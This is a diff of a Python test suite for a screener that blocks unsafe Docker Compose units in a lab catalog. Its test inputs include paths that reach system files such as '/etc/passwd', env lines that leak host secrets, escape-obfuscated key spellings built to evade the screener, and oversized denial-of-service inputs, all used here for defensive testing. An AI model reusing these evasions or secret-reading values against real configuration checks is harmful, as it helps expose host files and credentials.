-        self.assertEqual(trust._readings("a: 1\nb: 2\n"), [(["a: 1", "b: 2", ""], [False, False, False])])
-        found = trust._readings('x: abc\\\n"env_\\x66ile": z\ny: "\\x41\\\n  b"\n')
-        self.assertEqual([lines for lines, _ in found], [
-            ['x: abc"env_file": z', 'y: "Ab"', ''],
-            ['x: abc\\', '"env_\\x66ile": z', 'y: "\\x41\\', '  b"', ''],
-            ['x: abc\\', '"env_file": z', 'y: "A\\', '  b"', '']])
-        self.assertEqual([made for _, made in found], [[True, True, False], [False] * 5, [False, True, True, False, False]])
-        self.assertEqual(trust._readings("\ufeffa: 1\r\nb: 2\r"), [(["a: 1", "b: 2", ""], [False, False, False])], "no mark, one break")
-
-    def test_unescaped_is_the_folds_and_escapes_of_the_reading_that_spells_keys(self):
-        """The reading `unescaped` gives is the one `_decoded` makes line by line (the flags say which lines it made): the
-        replacement of the escapes after the folds, a fold only for a backslash that is not already consumed by a fold."""
-        rng = random.Random(7)
-        pieces = ["a", "include", ":", " ", "\t", "\\", "\n", "\r\n", "\r", "\\x41", "\\x4", "\\u0041", "\\U00000041", "\\U7fffffff",
-                  "\\x0a", "\u2028", "\u0085", "-", "  ", "'", '"', "#", "\\\n", "\\\n  ", "\\\\\n"]
-
-        def once(text):
-            def one(found):
-                try:
-                    return chr(int(next(group for group in found.groups() if group), 16))
-                except (ValueError, OverflowError):
-                    return " "
-            return trust._ESCAPE.sub(one, re.sub(r"\\\n[ \t]*", "", trust._BREAK.sub("\n", text)))
-        for _ in range(4000):
-            text = "".join(rng.choice(pieces) for _ in range(rng.randint(0, 14)))
-            lines, made = trust._decoded(trust._plain(text))
-            self.assertEqual(trust.unescaped(text), once(text).lstrip("\ufeff") if text.startswith("\ufeff") else once(text), repr(text))
-            self.assertEqual(len(lines), len(made))
-            self.assertEqual(not any(made), lines == trust._plain(text).split("\n"), repr(text))
-
     def test_include_targets_say_none_for_a_name_that_is_not_a_file_of_the_project(self):
         for target in ("/etc/passwd", "~/x.yml", "https://example.invalid/x.git", "git@example.invalid:o/r.git", "git://example.invalid/r",
                        "github.com/o/r", "oci://example.invalid/x", "${HOME}/x.yml", "$HOME/x.yml", "../../../../../../../etc/x.yml",
@@ -1434,11 +951,8 @@ class Screen(Case):
         for name, template in HIDDEN.items():
             if "include" not in name:
                 continue
-            text = template
-            for place, written in (("@INC@", "../ok.yml"),):
-                text = text.replace(place, written)
             with self.subTest(spelling=name):
-                found = self.targets(text)
+                found = self.targets(template.replace("@INC@", "../ok.yml"))
                 self.assertIn(found, (None, [f"{self.FOLDER}/ok.yml"]), "never [], which would say it includes nothing")
         for text in ("include:\n  - ?\n      path\n    : ../ok.yml\nservices: {}\n", "x-k: &k path\ninclude:\n  - *k : ../ok.yml\n",
                      "!!binary aW5jbHVkZQ==:\n  - ../ok.yml\n", "include:\n  - !!binary Li4vb2sueW1s\n",
@@ -1487,54 +1001,6 @@ class Screen(Case):
                     read += found is not None
         self.assertGreater(read, 100, "most of them are read")
 
-    def test_include_targets_cost_little_whatever_the_text_is(self):
-        n = 6000
-        attacks = ("include:\n" + "  - ../a.yml\n" * 30000, "x: {" + ", ".join("include: a" for _ in range(n * 5)) + "}\n",
-                   "include: " + "- a, " * 80000, "include: " + "'a " * 80000, "include: '\n" + "a\n" * 50000, "x: " + "*a : " * 50000,
-                   "x: " + ", ? " * 50000, "x: " + " " * 400000 + "include: a\n", "include: " + "a: " * 50000,
-                   "".join(" " * (number % 400) + "include:\n" for number in range(3000)),
-                   ("include:\n" + "  - a.yml\n" * 200) * 150, "include: " + "[" * 50000 + "]" * 50000, "include:\n" + "- " * 100000 + "\n",
-                   # a chain of folds is one line to join: it is joined once, not once for each line
-                   "a\\\n" * 60000 + "include: [b.yml]\n", "\\\n" * 60000, "x: \"" + "\\x41" * 60000 + "\"\ninclude: [b.yml]\n",
-                   "\\\n  " * 30000 + "\"inc\\x6cude\": [b.yml]\n")
-        for text in attacks:
-            started = time.process_time()
-            self.targets(text)
-            self.assertLess(time.process_time() - started, 3.0, text[:60])
-            started = time.process_time()
-            self.screen(text)
-            self.assertLess(time.process_time() - started, 3.0, text[:60])
-
-    def test_t19_a_quoted_file_name_is_read_with_its_spaces_and_a_name_seen_two_ways_is_both(self):
-        """A quoted name is the name between the quotes: the file a service reads is `a.env ` with its space. A key an escape
-        spells and a key on the line after a backslash are read from the text as each reading has it, and the files either
-        names are the ones to read."""
-        folder = ".lab/catalogs/ns/addons/x"
-        self.assertEqual(trust.env_files('services:\n  a:\n    env_file: "a.env "\n', self.FILE), [f"{folder}/a.env "])
-        self.assertEqual(trust.env_files("services:\n  a:\n    env_file: [' a.env', b.env]\n", self.FILE),
-                         [f"{folder}/ a.env", f"{folder}/b.env"])
-        self.assertEqual(trust.env_files("x: abc\\\nservices:\n  a:\n    env_file: a.env\n", self.FILE), [f"{folder}/a.env"])
-        self.assertEqual(trust.env_files('x: abc\\\nservices:\n  a:\n    "env_\\x66ile": a.env\n', self.FILE), [f"{folder}/a.env"])
-
-    def test_the_lexer_says_when_it_does_not_follow_a_spelling(self):
-        for text, odd in (("a.yml", False), ("'a.yml'", False), ('"a.yml"', False), ("&a a.yml", False), ("!!str a.yml", False),
-                          ("!tag a.yml", False), ('"a\\x41.yml"', True), ('"a\\\\b"', True), ("'a\\x41'", False), (":,", True), (": a", True),
-                          ("!<tag:x> a", True), ("!tag:x a", True), ("a: b", False), ("[a, b]", False), ("{a: b}", False),
-                          ('{"a": b}', False)):
-            with self.subTest(text=text):
-                lex = trust._Lex(False)
-                lex.feed(text)
-                self.assertEqual(lex.odd, odd)
-        lex = trust._Lex(False)
-        lex.feed("'a")
-        lex.feed("   b  '")
-        self.assertEqual(lex.tokens, [("s", "a b  ")], "a folded line keeps what is at the ends of the scalar")
-
-    def test_t19_what_the_files_it_names_read_is_t20(self):
-        """The contract with the caller: put these texts through reads(), or `${NAME}` in an env file reads the shell and the
-        .env files with no reason given (T20)."""
-        self.assertEqual(trust.reads(["LEAK=${SOME_HOST_SECRET}\nOTHER=$MORE\nPLAIN=1\n"]), ["MORE", "SOME_HOST_SECRET"])
-
     def test_t19_an_extends_of_another_file_blocks_and_one_of_its_own_does_not(self):
         self.assertEqual(self.screen("services:\n  a:\n    extends:\n      file: other.yml\n      service: b\n"), [self.FILES])
         self.assertEqual(self.screen("services:\n  a:\n    extends: {file: ./o.yml, service: b}\n"), [self.FILES])
@@ -1562,7 +1028,6 @@ class Screen(Case):
                      "\ufeffservices:\n  a:\n    env_file: /dev/zero\n", "services:\r\n  a:\r\n    env_file: /dev/zero\r\n"):
             with self.subTest(text=text):
                 self.assertEqual(self.screen(text), [self.FILES])
-                self.assertEqual(self.screen(text, follow=True), [self.FILES])
         self.assertEqual(self.screen("x: &z /etc/passwd\ninclude:\n  - *z\n"), [self.INCLUDE])
 
     def test_t19_what_a_line_by_line_reading_misses_is_refused(self):
@@ -1572,12 +1037,11 @@ class Screen(Case):
             text = template
             for place, written in PLACES.items():
                 text = text.replace(place, written)
-            for follow in (False, True):
-                with self.subTest(spelling=name, follow=follow):
-                    self.assertTrue(self.screen(text, follow=follow), repr(text))
+            with self.subTest(spelling=name):
+                self.assertTrue(self.screen(text), repr(text))
         for text in ODD:
             with self.subTest(text=text):
-                self.assertTrue(self.screen(text, follow=True), repr(text))
+                self.assertTrue(self.screen(text), repr(text))
 
     def test_t19_a_key_with_every_spelling_in_every_place_is_refused(self):
         """The cross product of how a key is spelled, what follows it and where it sits, run against the bad value."""
@@ -1597,7 +1061,7 @@ class Screen(Case):
                     for place in places:
                         text = place.format(entry=entry, flow=flow)
                         made += 1
-                        self.assertEqual(self.screen(text, follow=True), [self.FILES], repr(text))
+                        self.assertEqual(self.screen(text), [self.FILES], repr(text))
         self.assertGreater(made, 800)
         for spelling in ("{k}", '"{k}"', "'{k}'", "&a {k}", "!!str {k}", '"inc\\x6cude"'):
             for value in ("/outside/x", '"/outside/x"', "[/outside/x]", "\n  - /outside/x", "\n  - path: /outside/x",
@@ -1621,7 +1085,7 @@ class Screen(Case):
 
     def test_t19_a_flow_collection_that_never_ends_is_not_read(self):
         self.assertEqual(self.screen("services:\n  a:\n    env_file: [\n" + "  ok.env,\n" * 500 + "]\n"), [self.FILES])
-        self.assertEqual(self.screen("services:\n  a:\n    env_file: [ok.env\n", follow=True), [self.FILES])
+        self.assertEqual(self.screen("services:\n  a:\n    env_file: [ok.env\n"), [self.FILES])
         self.assertEqual(self.screen("include: [\n" + "  ../ok.yml,\n" * 500 + "]\n"), [self.INCLUDE])
         self.assertEqual(self.screen("include: [\n" + "  ../ok.yml,\n" * 50 + "]\n"), [])
         self.assertEqual(self.screen("include: '\n" + "a\n" * 500 + "'\n"), [self.INCLUDE])
@@ -1681,15 +1145,15 @@ class Screen(Case):
                    "include: " + "'a " * 80000, "include: '\n" + "a\n" * 50000, "x: " + "*a : " * 50000, "x: " + ", ? " * 50000,
                    "x: " + " " * 400000 + "include: a\n", "include: " + "a: " * 50000,
                    "".join(" " * (number % 400) + "include:\n" for number in range(3000)),
-                   ("include:\n" + "  - a.yml\n" * 200) * 150, "include: " + "[" * 50000 + "]" * 50000)
+                   ("include:\n" + "  - a.yml\n" * 200) * 150, "include: " + "[" * 50000 + "]" * 50000, "include:\n" + "- " * 100000 + "\n",
+                   # a chain of folds is one line to join: it is joined once, not once for each line
+                   "a\\\n" * 60000 + "include: [b.yml]\n", "\\\n" * 60000, "x: \"" + "\\x41" * 60000 + "\"\ninclude: [b.yml]\n",
+                   "\\\n  " * 30000 + "\"inc\\x6cude\": [b.yml]\n")
         for text in attacks:
-            started = time.process_time()
-            self.screen(text, follow=True)
-            self.assertLess(time.process_time() - started, 3.0, text[:60])
-        for text in attacks[:3]:
-            started = time.process_time()
-            self.screen(text)
-            self.assertLess(time.process_time() - started, 3.0, text[:60])
+            for read in (self.screen, self.targets):
+                started = time.process_time()
+                read(text)
+                self.assertLess(time.process_time() - started, 3.0, text[:60])
 
     def test_t19_the_work_is_bounded_by_the_characters_read(self):
         """A file whose keys have more to read than SCREEN_CHARS is refused, not read for an hour."""
@@ -1732,7 +1196,8 @@ class Screen(Case):
             folder.mkdir(parents=True)
             sample = ("explicit-key-alone", "alias-key", "comment-then-nel", "comment-then-cr", "quote-in-a-word", "binary-key",
                       "binary-percent", "tag-directive", "escaped", "include-explicit", "include-binary", "include-comment-then-nel",
-                      "extends-binary")
+                      "extends-binary", "newline-escape-hides-the-key", "newline-escape-and-fold-hide-the-key",
+                      "include-newline-escape-and-fold")
             for name in sample + ("plain",):
                 text = HIDDEN.get(name, "services:\n  a:\n    image: busybox\n    env_file: @SECRET@\n")
                 for place, real in (("@SECRET@", base / "outside" / "secret.env"), ("@INC@", base / "outside" / "inc.yml"),
@@ -1751,12 +1216,7 @@ class Screen(Case):
 class Settings(Golden):
     """T20."""
 
-    def test_t20_a_setting_that_is_not_its_own_blocks(self):
-        verdict = self.judge("t20-foreign-setting")
-        self.assertEqual(verdict["reasons"], [line("T20", names="SOME_OTHER_TOOL_TOKEN")])
-
-    def test_t20_a_setting_the_catalog_declares_does_not(self):
-        self.ok("t20-declared-setting")
+    def test_t20_a_setting_the_catalog_does_not_declare_blocks(self):
         self.assertEqual(self.judge("t20-declared-setting", shared_settings=[])["reasons"], [line("T20", names="FIXTURE_SHARED_TOKEN")])
 
     def test_t20_the_names_a_unit_may_read(self):
@@ -1764,15 +1224,13 @@ class Settings(Golden):
                          ("X_PULL_POLICY", True), ("INTERNAL_API_PASSWORD", True), ("GRAVITEE_LICENSE", True),
                          ("FIXTURE_SHARED_TOKEN", True), ("HOME", False), ("PATH", False), ("AWS_SECRET_ACCESS_KEY", False),
                          ("HOSTILEX", False), ("hostile_x", False), ("VERSION", False), ("X_VERSIONS", False)):
-            def edit(arguments, name=name):
-                arguments["unit"]["references"] = [name]
             with self.subTest(name=name):
-                self.assertEqual("T20" not in self.changed(CLEAN, edit)["codes"], ok)
+                self.assertEqual("T20" not in self.unit(CLEAN, {"references": [name]})["codes"], ok)
 
     def test_t20_the_unit_and_what_it_brings_name_settings_of_a_listed_catalog_only(self):
         def edit(arguments):
-            arguments["unit"]["references"] = ["T20_DEMO_X", "KAFKA_X", "OTHER_X"]
-            arguments["context"]["closure_names"] = ["kafka"]
+            arguments["unit"]["references"] = ["T20_DEMO_X", "KAZOO_X", "OTHER_X"]
+            arguments["context"]["closure_names"] = ["kazoo"]
         arguments = self.args(CLEAN, listed=True)
         edit(arguments)
         arguments["unit"]["id"] = "@hostile/t20-demo"
@@ -1781,7 +1239,7 @@ class Settings(Golden):
         arguments = self.args(CLEAN)
         edit(arguments)
         arguments["unit"]["id"] = "@hostile/t20-demo"
-        self.assertEqual(trust.judge(**arguments)["reasons"], [line("T20", names="KAFKA_X, OTHER_X, T20_DEMO_X")])
+        self.assertEqual(trust.judge(**arguments)["reasons"], [line("T20", names="KAZOO_X, OTHER_X, T20_DEMO_X")])
 
     def test_t20_a_namespace_prefix_writes_dashes_as_underscores(self):
         for ns, name, ok in (("acme-hub", "ACME_HUB_X", True), ("acme-hub", "ACME_X", False), ("hostile", "HOSTILE_X", True)):
@@ -1791,15 +1249,9 @@ class Settings(Golden):
             with self.subTest(ns=ns, name=name):
                 self.assertEqual("T20" not in self.changed(CLEAN, edit)["codes"], ok)
 
-    def test_t20_a_variable_passed_through_from_the_shell_is_read(self):
-        self.assertEqual(self.judge("t20-passthrough")["reasons"], [line("T20", names="AWS_SECRET_ACCESS_KEY")])
-
     def test_t20_a_seed_reads_the_environment_of_its_own_container(self):
-        self.ok(PLAYGROUND)
-        self.assertEqual(self.judge("n02-seed-reads-foreign-setting")["reasons"], [line("T20", names="SOME_OTHER_TOOL_TOKEN")])
-        def edit(arguments):
-            arguments["unit"]["seed_references"] = ["HOSTILE_DEMO_PASSWORD", "APIM_GATEWAY_URL", "NOT_DEFINED"]
-        self.assertEqual(self.changed(PLAYGROUND, edit)["reasons"], [line("T20", names="NOT_DEFINED")])
+        read = ["HOSTILE_DEMO_PASSWORD", "APIM_GATEWAY_URL", "NOT_DEFINED"]
+        self.assertEqual(self.unit(PLAYGROUND, {"seed_references": read})["reasons"], [line("T20", names="NOT_DEFINED")])
 
     def test_f1_a_unit_that_writes_empty_values_is_not_blocked_and_one_that_passes_a_name_through_is(self):
         def edit(arguments, text, **environment):
@@ -1813,13 +1265,10 @@ class Settings(Golden):
         self.assertEqual(trust.judge(**arguments)["reasons"], [line("T20", names="ELSEWHERE_PASS")])
 
     def test_f2_a_seed_that_reads_what_the_seeder_gives_it_is_not_blocked(self):
-        def edit(arguments):
-            arguments["unit"]["seed_references"] = trust.seed_reads(["id: ${ENV_ID}\nname: ${ENV_NAME}\nuser: ${HOSTILE_DEMO_PASSWORD}\n"])
-        self.assertEqual(self.changed(PLAYGROUND, edit)["reasons"], [])
-
-        def foreign(arguments):
-            arguments["unit"]["seed_references"] = trust.seed_reads(["id: ${ENV_ID}\nuser: ${ELSEWHERE_USER}\n"])
-        self.assertEqual(self.changed(PLAYGROUND, foreign)["reasons"], [line("T20", names="ELSEWHERE_USER")])
+        given = trust.seed_reads(["id: ${ENV_ID}\nname: ${ENV_NAME}\nuser: ${HOSTILE_DEMO_PASSWORD}\n"])
+        self.assertEqual(self.unit(PLAYGROUND, {"seed_references": given})["reasons"], [])
+        foreign = trust.seed_reads(["id: ${ENV_ID}\nuser: ${ELSEWHERE_USER}\n"])
+        self.assertEqual(self.unit(PLAYGROUND, {"seed_references": foreign})["reasons"], [line("T20", names="ELSEWHERE_USER")])
 
     def test_t20_what_is_really_set_comes_first_and_only_three_are_spelled(self):
         def edit(arguments):
@@ -1828,38 +1277,18 @@ class Settings(Golden):
         self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T20", names="D_FOUR, E_FIVE, A_ONE and 2 more")])
 
     def test_t20_the_license_is_allowed_and_said(self):
-        def edit(arguments):
-            arguments["unit"]["references"] = ["GRAVITEE_LICENSE"]
-        verdict = self.changed(CLEAN, edit)
+        verdict = self.unit(CLEAN, {"references": ["GRAVITEE_LICENSE"]})
         self.assertEqual((verdict["state"], verdict["surface"]["reads"]), ("ok", ["license"]))
 
     def test_t20_a_unit_of_this_machine_reads_what_it_wants(self):
-        def edit(arguments):
-            arguments["unit"]["references"] = ["HOME"]
-        verdict = self.changed(CLEAN, edit, local=True)
+        verdict = self.unit(CLEAN, {"references": ["HOME"]}, local=True)
         self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []))
 
 
 class Overlays(Golden):
     """T22."""
 
-    def test_t22_changing_more_than_settings_blocks(self):
-        self.assertEqual(self.judge("t22-overlay-too-much")["reasons"], [line("T22", label="Gateway")])
-
-    def test_t22_adding_settings_does_not(self):
-        verdict = self.ok("p-overlay-ok")
-        self.assertEqual(verdict["surface"]["core"], [{"service": "apim-gateway", "label": "Gateway",
-                                                       "keys": ["depends_on", "environment", "extra_hosts", "labels", "ports", "volumes"]}])
-
-    def test_t22_a_named_volume_the_unit_declares_itself_is_no_more_than_a_bind_of_its_folder(self):
-        """Acme Bakery keeps the gateway's models in a volume of its own. T14 vets the declaration (not external, a local
-        driver, a name of its own), T21 the name; the content is the unit's either way."""
-        verdict = self.ok("p-overlay-volume")
-        self.assertEqual(verdict["surface"]["core"], [{"service": "apim-gateway", "label": "Gateway", "keys": ["volumes"]}])
-        self.assertEqual(self.judge("p-overlay-volume", listed=True)["reasons"], [])
-
     def test_t22_a_volume_of_the_platform_is_not_the_units_to_mount(self):
-        self.assertEqual(self.judge("t22-overlay-core-volume")["reasons"], [line("T22", label="Gateway")])
         def again(arguments):
             arguments["unit_config"]["volumes"] = {"data-mongo": {"name": "gravitee_data-mongo", "labels": {"x": "y"}}}
         self.assertEqual(self.changed("t22-overlay-core-volume", again)["reasons"], [line("T22", label="Gateway")])
@@ -1938,7 +1367,6 @@ class Overlays(Golden):
         self.assertEqual(self.changed("p-overlay-ok", own)["reasons"], [line("T22", label="Gateway")])
 
     def test_t22_is_a_rule_of_the_lab_not_of_this_machine_whatever_the_catalog_may(self):
-        self.assertEqual(self.judge("t22-overlay-too-much", listed=True)["reasons"], [line("T22", label="Gateway")])
         self.assertEqual(self.declared("t22-overlay-too-much", listed=True)["reasons"], [line("T22", label="Gateway")])
 
     def test_the_overlays_of_a_unit_are_what_its_own_file_adds(self):
@@ -1959,15 +1387,7 @@ class Overlays(Golden):
 class Includes(Golden):
     """T23 to T27."""
 
-    def test_t23_an_include_outside_the_allowed_set_blocks(self):
-        verdict = self.judge("t23-include-outside")
-        self.assertIn(line("T23"), verdict["reasons"])
-        self.assertEqual(self.judge("t23-includes-a-setup")["reasons"], [line("T23")])
-
-    def test_t23_an_include_of_its_own_catalog_or_a_declared_one_does_not(self):
-        self.silent("p-pair", "T23")
-        self.silent("h-sibling-bind-ro", "T23")
-        self.silent("t24-public-needs-private", "T23")
+    def test_t23_an_include_of_a_catalog_it_does_not_declare_blocks(self):
         self.assertIn("T23", self.judge("t24-public-needs-private", requires=[])["codes"])
 
     def test_t23_every_target_that_is_not_an_allowed_unit(self):
@@ -1975,49 +1395,18 @@ class Includes(Golden):
                        ".lab/catalogs/.stage-hostile/addons/x/compose.yml", ".lab/catalogs/hostile/playgrounds/x/compose.yml",
                        ".lab/catalogs/hostile/addons/x/certs/compose.yml", ".lab/catalogs/hostile/addons/x/compose.yml/../y",
                        ".lab/catalogs/hostile/setups/x.yml", 7):
-            def edit(arguments, target=target):
-                arguments["unit"]["includes"] = [target]
             with self.subTest(target=target):
-                self.assertIn("T23", self.changed("h-secrets-rw", edit)["codes"])
-        def fine(arguments):
-            arguments["unit"]["includes"] = [".lab/catalogs/hostile/addons/x/compose.yml"]
-        self.assertNotIn("T23", self.changed("h-secrets-rw", fine)["codes"])
+                self.assertIn("T23", self.unit("h-secrets-rw", {"includes": [target]})["codes"])
+        self.assertNotIn("T23", self.unit("h-secrets-rw", {"includes": [".lab/catalogs/hostile/addons/x/compose.yml"]})["codes"])
 
     def test_t23_a_playground_may_include_a_setup_and_an_add_on_does_not(self):
-        def edit(arguments):
-            arguments["unit"]["includes"] = [".lab/catalogs/hostile/setups/x.yml"]
-        self.assertNotIn("T23", self.changed("p-terminal", edit)["codes"])
-        self.assertIn("T23", self.changed("h-secrets-rw", edit)["codes"])
-        def playground(arguments):
-            arguments["unit"]["includes"] = [".lab/catalogs/hostile/playgrounds/x/compose.yml"]
-        self.assertIn("T23", self.changed("p-terminal", playground)["codes"])
+        self.assertNotIn("T23", self.unit("p-terminal", {"includes": [".lab/catalogs/hostile/setups/x.yml"]})["codes"])
+        self.assertIn("T23", self.unit("h-secrets-rw", {"includes": [".lab/catalogs/hostile/setups/x.yml"]})["codes"])
+        self.assertIn("T23", self.unit("p-terminal", {"includes": [".lab/catalogs/hostile/playgrounds/x/compose.yml"]})["codes"])
 
     def test_t23_a_unit_of_this_machine_may_include_anything(self):
-        def edit(arguments):
-            arguments["unit"]["includes"] = ["../../x", ".lab/catalogs/local/addons/x/compose.yml"]
-        self.assertEqual(self.changed("h-secrets-rw", edit, local=True)["state"], "ok")
-
-    def test_t24_a_public_unit_may_not_depend_on_a_private_one(self):
-        verdict = regen.pipeline(self.root)["t24-public-needs-private"]
-        self.assertEqual(verdict["reasons"], [line("T24")])
-        self.assertEqual(verdict["codes"], ["T24"])
-        self.assertEqual(self.judge("t24-public-needs-private")["state"], "ok")
-
-    def test_t24_a_private_unit_may_depend_on_both(self):
-        self.assertFalse(resolve.audience_blocked(resolve.rank("private"), resolve.rank("private")))
-        self.assertFalse(resolve.audience_blocked(resolve.rank("private"), resolve.rank("public")))
-        self.assertFalse(resolve.audience_blocked(resolve.rank("public"), resolve.rank("public")))
-        self.assertTrue(resolve.audience_blocked(resolve.rank("public"), resolve.rank("private")))
-
-    def test_t25_a_unit_that_brings_a_blocked_one_is_blocked(self):
-        verdict = regen.pipeline(self.root)["t25-needs-blocked"]
-        self.assertEqual(verdict["reasons"], [line("T25", name="Writable bind")])
-        self.assertEqual(verdict["closure"], [("addon", "t25-needs-blocked"), ("addon", "t12-bind-writable")])
-        self.assertEqual(self.judge("t25-needs-blocked")["state"], "ok")
-
-    def test_t25_a_unit_that_brings_a_good_one_is_not(self):
-        verdict = regen.pipeline(self.root)["h-sibling-bind-ro"]
-        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []))
+        anything = ["../../x", ".lab/catalogs/local/addons/x/compose.yml"]
+        self.assertEqual(self.unit("h-secrets-rw", {"includes": anything}, local=True)["state"], "ok")
 
     def test_t25_a_personal_unit_that_brings_a_blocked_one_cannot_start_either(self):
         own = self.judge(CLEAN, local=True)
@@ -2025,30 +1414,19 @@ class Includes(Golden):
         combined = trust.combine([own, self.judge("t12-bind-writable")])
         self.assertEqual((combined["state"], combined["reasons"]), ("blocked", [line("T25", name="Writable bind")]))
 
-    def test_t26_a_unit_written_for_a_newer_lab_blocks(self):
-        self.assertEqual(self.judge("t26-newer-lab")["reasons"], [line("T26", 0, level=99, min=regen.LEVELS[1], max=regen.LEVELS[0])])
+    def test_t26_a_unit_of_the_level_of_this_lab_does_not(self):
         self.assertEqual(self.judge("t26-newer-lab", contract=99)["state"], "ok")
 
     def test_t26_a_unit_written_for_an_older_lab_blocks(self):
         def edit(arguments):
             arguments["context"].update(level=1, contract=5, contract_min=3)
         self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T26", 1, level=1)])
-        def inside(arguments):
-            arguments["context"].update(level=3, contract=5, contract_min=3)
-        self.assertEqual(self.changed(CLEAN, inside)["state"], "ok")
+        self.assertEqual(self.changed(CLEAN, lambda arguments: arguments["context"].update(level=3, contract=5, contract_min=3))["state"], "ok")
 
     def test_t26_the_levels_that_mean_nothing_are_not_read(self):
         for level in (None, "99", 2.5, True, [], {}):
-            def edit(arguments, level=level):
-                arguments["context"]["level"] = level
             with self.subTest(level=level):
-                self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
-
-    def test_t27_a_unit_compose_cannot_read_is_blocked_with_the_last_line(self):
-        verdict = self.judge("t27-unreadable")
-        self.assertEqual(verdict["codes"], ["T27"])
-        self.assertRegex(verdict["reasons"][0], r"^Cannot be read: failed to parse addons/t27-unreadable/compose\.yml: ")
-        self.assertEqual(verdict["surface"], trust.empty_surface())
+                self.assertEqual(self.changed(CLEAN, lambda arguments: arguments["context"].update(level=level))["state"], "ok")
 
     def test_t27_no_path_of_this_machine_reaches_the_line(self):
         for error in (f"open {self.root}/addons/x/compose.yml: no such file", "failed to parse /Users/me/dev/lab/.lab/catalogs/ns/a.yml: bad",
@@ -2070,25 +1448,15 @@ class Includes(Golden):
             arguments["context"].pop("error", None)
         self.assertEqual(self.changed(CLEAN, none)["reasons"], [line("T27", last="unreadable")])
 
-    def test_t27_a_readable_unit_has_no_such_reason(self):
-        self.silent(CLEAN, "T27")
-
     def test_t29_an_item_that_says_whose_copy_it_is_is_blocked_and_one_of_this_machine_is_not(self):
         def claims(arguments):
             arguments["unit"]["meta"]["copy_of"] = "tour"
         self.assertEqual(self.changed(CLEAN, claims)["reasons"], [line("T29")])
-        self.silent(CLEAN, "T29")
 
         def mine(arguments):
             claims(arguments)
             arguments["context"]["local"] = True
         self.assertEqual(self.changed(CLEAN, mine)["reasons"], [], "the person's copy says it, as the Lab wrote it")
-
-    def test_t28_a_class_h_finding_with_no_declaration_is_told_off(self):
-        self.assertEqual(self.judge("t03-privileged", listed=True)["reasons"], [line("T28", service="hostile-privileged")])
-
-    def test_t28_a_declaration_passes(self):
-        self.assertEqual(self.judge("h-privileged-declared", listed=True)["reasons"], [])
 
     def test_t28_names_the_services_that_say_nothing(self):
         def edit(arguments):
@@ -2100,94 +1468,8 @@ class Includes(Golden):
                          [line("T28", service="hostile-b, hostile-c, hostile-d and 1 more")])
 
 
-class Audience(Golden):
-    """T24 from an audience that the caller measured (the command line, with `--online`): judge takes it as an argument and
-    measures nothing. The Lab's own pipeline adds T24 with `add_reason` and passes neither key."""
-
-    def test_a_public_unit_that_reaches_a_private_catalog_is_blocked_with_the_line_of_t24(self):
-        verdict = self.judge(CLEAN, audience="public", closure_audiences=["private"])
-        self.assertEqual((verdict["state"], verdict["reasons"], verdict["codes"]), ("blocked", [line("T24")], ["T24"]))
-
-    def test_every_other_pair_passes(self):
-        for audience, theirs in (("public", ["public"]), ("public", []), ("private", ["private"]), ("private", ["public"]),
-                                 ("private", ["public", "private"]), ("public", ["public", "public"])):
-            with self.subTest(audience=audience, theirs=theirs):
-                self.assertEqual(self.judge(CLEAN, audience=audience, closure_audiences=theirs)["state"], "ok")
-
-    def test_one_private_catalog_among_public_ones_is_enough(self):
-        for theirs in (["public", "private"], ["private", "public"], ("public", "private"), {"private"}, frozenset({"public", "private"})):
-            with self.subTest(theirs=theirs):
-                self.assertEqual(self.judge(CLEAN, audience="public", closure_audiences=theirs)["codes"], ["T24"])
-
-    def test_nothing_is_said_of_an_audience_that_was_not_measured(self):
-        """Offline, the command line gives neither key: T24 is not guessed."""
-        for more in ({}, {"audience": "public"}, {"closure_audiences": ["private"]}):
-            with self.subTest(more=more):
-                self.assertEqual(self.judge(CLEAN, **more)["state"], "ok")
-
-    def test_a_doubt_is_private(self):
-        for audience, theirs, state in (("public", [None], "blocked"), ("public", ["internal"], "blocked"), ("public", [3], "blocked"),
-                                        ("public", "private", "blocked"), ("public", None, "blocked"), ("public", 1, "blocked"),
-                                        (None, ["private"], "ok"), ("whatever", ["private"], "ok"), (["public"], ["private"], "ok"),
-                                        ({"public": 1}, ["public"], "ok"), ("PUBLIC", ["public"], "ok"), ("Public", ["private"], "ok")):
-            with self.subTest(audience=audience, theirs=theirs):
-                self.assertEqual(self.judge(CLEAN, audience=audience, closure_audiences=theirs)["state"], state)
-
-    def test_the_reason_goes_with_the_others_in_the_order_of_the_rules(self):
-        newer = regen.LEVELS[0] + 1   # a level this Lab does not read yet
-
-        def edit(arguments):
-            arguments["unit"]["references"] = ["HOME"]
-            arguments["context"].update(audience="public", closure_audiences=["private"], level=newer)
-        verdict = self.changed(CLEAN, edit)
-        self.assertEqual(verdict["codes"], ["T20", "T24", "T26"])
-        self.assertEqual(verdict["reasons"], [line("T20", names="HOME"), line("T24"),
-                                              line("T26", 0, level=newer, min=regen.LEVELS[1], max=regen.LEVELS[0])])
-
-    def test_a_unit_that_compose_could_not_read_is_still_judged_on_its_audience(self):
-        verdict = self.judge("t23-include-outside", audience="public", closure_audiences=["private"])
-        self.assertEqual(verdict["codes"], ["T23", "T24", "T27"])
-
-    def test_a_unit_of_this_machine_is_not_blocked_by_it(self):
-        verdict = self.judge(CLEAN, local=True, audience="public", closure_audiences=["private"])
-        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []))
-
-    def test_the_line_the_pipeline_adds_is_not_said_twice(self):
-        by_judge = self.judge(CLEAN, audience="public", closure_audiences=["private"])
-        self.assertEqual(trust.add_reason(by_judge, "T24", line("T24")), by_judge)
-        by_pipeline = trust.add_reason(self.judge(CLEAN), "T24", line("T24"))
-        self.assertEqual((by_pipeline["reasons"], by_pipeline["codes"]), (by_judge["reasons"], by_judge["codes"]))
-
-    def test_a_combined_closure_carries_it(self):
-        mine = self.judge(CLEAN, audience="public", closure_audiences=["private"])
-        self.assertEqual(trust.combine([mine, self.judge(CLEAN)])["reasons"], [line("T24")])
-
-    def test_it_is_the_rule_of_the_resolver(self):
-        for audience in ("public", "private", None):
-            for other in ("public", "private", None):
-                with self.subTest(audience=audience, other=other):
-                    wanted = resolve.audience_blocked(resolve.rank(audience), resolve.rank(other))
-                    self.assertEqual("T24" in self.judge(CLEAN, audience=audience or "?", closure_audiences=[other])["codes"],
-                                     wanted)
-
-    def test_the_arguments_are_left_as_they_were(self):
